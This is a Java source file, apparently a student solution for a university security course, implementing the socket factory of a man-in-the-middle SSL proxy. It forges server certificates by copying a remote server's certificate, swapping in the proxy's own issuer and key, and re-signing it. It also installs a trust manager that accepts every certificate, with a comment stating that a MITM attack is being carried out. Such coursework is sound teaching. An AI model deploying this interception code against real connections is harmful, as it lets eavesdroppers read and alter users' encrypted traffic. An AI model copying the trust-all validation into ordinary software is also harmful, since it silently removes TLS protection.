//Based on SnifferSSLSocketFactory.java from The Grinder distribution.
// The Grinder distribution is available at http://grinder.sourceforge.net/

package mitm;

import iaik.asn1.ObjectID;
import iaik.asn1.structures.AlgorithmID;
import iaik.asn1.structures.Name;
import iaik.x509.X509Certificate;

import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;

import java.io.ByteArrayInputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.GeneralSecurityException;
import java.security.KeyStore;
import java.security.Principal;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.cert.Certificate;
import java.security.cert.CertificateFactory;
import java.util.Calendar;
import java.util.GregorianCalendar;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLServerSocket;
import javax.net.ssl.SSLServerSocketFactory;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.X509TrustManager;


/**
 * MITMSSLSocketFactory is used to create SSL sockets.
 *
 * This is needed because the javax.net.ssl socket factory classes don't
 * allow creation of factories with custom parameters.
 *
 */
public final class MITMSSLSocketFactory implements MITMSocketFactory
{
    final ServerSocketFactory m_serverSocketFactory;
    final SocketFactory m_clientSocketFactory;
    final SSLContext m_sslContext;

    public KeyStore ks = null;

    /*
     *
     * We can't install our own TrustManagerFactory without messing
     * with the security properties file. Hence we create our own
     * SSLContext and initialise it. Passing null as the keystore
     * parameter to SSLContext.init() results in a empty keystore
     * being used, as does passing the key manager array obtain from
     * keyManagerFactory.getInstance().getKeyManagers(). To pick up
     * the "default" keystore system properties, we have to read them
     * explicitly. UGLY, but necessary so we understand the expected
     * properties.
     *
     */

    /**
     * This constructor will create an SSL server socket factory
     * that is initialized with a fixed CA certificate
     */
    public MITMSSLSocketFactory()
	throws IOException,GeneralSecurityException
    {
	m_sslContext = SSLContext.getInstance("SSL");

	final KeyManagerFactory keyManagerFactory =
	    KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());

	final String keyStoreFile = System.getProperty(JSSEConstants.KEYSTORE_PROPERTY);
	final char[] keyStorePassword = System.getProperty(JSSEConstants.KEYSTORE_PASSWORD_PROPERTY, "").toCharArray();
	final String keyStoreType = System.getProperty(JSSEConstants.KEYSTORE_TYPE_PROPERTY, "jks");

	final KeyStore keyStore;
	
	if (keyStoreFile != null) {
	    keyStore = KeyStore.getInstance(keyStoreType);
	    keyStore.load(new FileInputStream(keyStoreFile), keyStorePassword);

	    this.ks = keyStore;
	} else {
	    keyStore = null;
	}

	keyManagerFactory.init(keyStore, keyStorePassword);

	m_sslContext.init(keyManagerFactory.getKeyManagers(),
			  new TrustManager[] { new TrustEveryone() },
			  null);

	m_clientSocketFactory = m_sslContext.getSocketFactory();
	m_serverSocketFactory = m_sslContext.getServerSocketFactory(); 
    }

    /**
     * This constructor will create an SSL server socket factory
     * that is initialized with a dynamically generated server certificate
     * that contains the specified Distinguished Name.
     */
    public MITMSSLSocketFactory(Principal serverDN, BigInteger serialNumber, iaik.x509.X509Certificate remoteCertificate)
	throws IOException,GeneralSecurityException, Exception
	// TODO(cs255): replace this with code to generate a new (forged) server certificate with a DN of serverDN
    //   and a serial number of serialNumber.
	{
    
	// You may find it useful to work from the comment skeleton below.

	final String keyStoreFile = System.getProperty(JSSEConstants.KEYSTORE_PROPERTY);
	final char[] keyStorePassword = System.getProperty(JSSEConstants.KEYSTORE_PASSWORD_PROPERTY, "").toCharArray();
	final String keyStoreType = System.getProperty(JSSEConstants.KEYSTORE_TYPE_PROPERTY, "jks");
	// The "alias" is the name of the key pair in our keystore. (default: "mykey")
	final String alias = System.getProperty(JSSEConstants.KEYSTORE_ALIAS_PROPERTY, JSSEConstants.DEFAULT_ALIAS);
	
	final KeyStore keyStore;
	
	if (keyStoreFile != null) {
	    keyStore = KeyStore.getInstance(keyStoreType);
	    keyStore.load(new FileInputStream(keyStoreFile), keyStorePassword);
	    
	    this.ks = keyStore;
	} else {
	    keyStore = null;
	}

	System.out.println("Begin to forge certificate...");
	// Get our key pair and our own DN (not the remote server's DN) from the keystore.
	PrivateKey privateKey = (PrivateKey) keyStore.getKey(alias, keyStorePassword);
	//Use IAIK's cert-factory, so we can easily use the X509CertificateGenerator!
	iaik.x509.X509Certificate ourCertificate = new iaik.x509.X509Certificate(keyStore.getCertificate(alias).getEncoded());
	PublicKey publicKey = ourCertificate.getPublicKey();
	Principal ourDN = ourCertificate.getIssuerDN();
	
	// forge certificate using between client and proxy based on certificate using between proxy and server
	iaik.x509.X509Certificate serverCertificate = new iaik.x509.X509Certificate(remoteCertificate.getEncoded());
	// Some proxy information
	serverCertificate.setIssuerDN(ourDN);	
	serverCertificate.setPublicKey(publicKey);	
	// Some server information
	//serverCertificate.setSubjectDN(serverDN);
	//serverCertificate.setSerialNumber(serialNumber);
	serverCertificate.sign(AlgorithmID.sha256WithRSAEncryption, privateKey);
	// For CN testing
	System.out.println("Certificate forged.");
	Name n = (Name)serverCertificate.getSubjectDN();
    String serverCN = n.getRDN(ObjectID.commonName);
	System.out.println("Common name: " + serverCN);
	System.out.println("Serial Number: " + serverCertificate.getSerialNumber());	
	
	// Setup keyStore for proxy an server communication
	final KeyManagerFactory keyManagerFactory =
		    KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
	KeyStore serverKeyStore = KeyStore.getInstance(keyStoreType);
	serverKeyStore.load(null, null);
	serverKeyStore.setKeyEntry(JSSEConstants.DEFAULT_ALIAS, privateKey, keyStorePassword, new Certificate[] { serverCertificate });
	keyManagerFactory.init(serverKeyStore, keyStorePassword);

	// Deal with SSL connection
	m_sslContext = SSLContext.getInstance("SSL");
	m_sslContext.init(keyManagerFactory.getKeyManagers(),
			  new TrustManager[] { new TrustEveryone() },
			  null);
	m_clientSocketFactory = m_sslContext.getSocketFactory();
	m_serverSocketFactory = m_sslContext.getServerSocketFactory(); 

	//=====================change end===================
    }

    public final ServerSocket createServerSocket(String localHost,
						 int localPort,
						 int timeout)
	throws IOException
    {
	final SSLServerSocket socket =
	    (SSLServerSocket)m_serverSocketFactory.createServerSocket(
		localPort, 50, InetAddress.getByName(localHost));

	socket.setSoTimeout(timeout);

	socket.setEnabledCipherSuites(socket.getSupportedCipherSuites());

	return socket;
    }

    public final Socket createClientSocket(String remoteHost, int remotePort)
	throws IOException
    {
	final SSLSocket socket =
	    (SSLSocket)m_clientSocketFactory.createSocket(remoteHost,
							  remotePort);

	socket.setEnabledCipherSuites(socket.getSupportedCipherSuites());
	
	socket.startHandshake();

	return socket;
    }

    /**
     * We're carrying out a MITM attack, we don't care whether the cert
     * chains are trusted or not ;-)
     *
     */
    private static class TrustEveryone implements javax.net.ssl.X509TrustManager
    {
	public void checkClientTrusted(java.security.cert.X509Certificate[] chain,
				       String authenticationType) {
	}
	
	public void checkServerTrusted(java.security.cert.X509Certificate[] chain,
				       String authenticationType) {
	}

	public java.security.cert.X509Certificate[] getAcceptedIssuers()
	{
	    return null;
	}
    }
}
    
